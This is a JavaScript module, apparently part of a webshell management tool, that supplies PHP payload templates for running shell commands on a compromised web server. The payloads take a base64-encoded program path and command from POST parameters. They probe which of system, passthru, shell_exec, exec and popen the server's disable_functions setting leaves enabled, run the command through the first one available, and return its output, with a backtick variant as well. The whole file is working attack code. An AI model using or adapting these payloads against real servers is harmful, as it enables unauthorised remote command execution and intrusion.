/**
 * 虚拟终端命令执行
 */

module.exports = (arg1, arg2) => ({
  exec: {
    _:
      `$p=base64_decode($_POST["${arg1}"]);$s=base64_decode($_POST["${arg2}"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runcmd($c){$ret=0;if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("\n",$o));}elseif (fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp, 2048));}@pclose($fp);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";`,
    [arg1]: "#{base64::bin}",
    [arg2]: "#{base64::cmd}"
  },

  quote: {
    _:
      `$p=base64_decode($_POST["${arg1}"]);$s=base64_decode($_POST["${arg2}"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";echo \`{$r} 2>&1\``,
    [arg1]: "#{base64::bin}",
    [arg2]: "#{base64::cmd}"
  }
})
